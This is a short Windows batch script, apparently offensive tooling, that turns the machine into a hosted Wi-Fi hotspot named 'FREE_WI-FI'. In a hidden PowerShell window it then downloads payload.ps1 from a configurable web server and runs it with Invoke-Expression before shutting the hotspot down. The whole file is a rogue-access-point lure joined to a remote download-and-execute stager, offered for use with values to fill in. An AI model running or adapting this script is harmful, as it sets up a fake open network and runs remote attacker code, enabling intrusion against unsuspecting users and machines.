@echo off
REM Must be run it as admin
REM Replace this variables with your own values
set SSID=FREE_WI-FI
set KEY=!Pass123
set IP_ADDR=127.0.0.1
set WEB_SERVER_ADDR=http://127.0.0.1/MrRobot

netsh wlan set hostednetwork mode=allow ssid=%SSID% key=%KEY%
netsh wlan start hostednetwork

powershell -W H "while (!(ping %IP_ADDR% -n 1)[2].Contains('%IP_ADDR%')){}; Invoke-Expression (New-Object Net.WebClient).DownloadString('%WEB_SERVER_ADDR%/payload.ps1'); x %WEB_SERVER_ADDR%; netsh wlan stop hostednetwork"
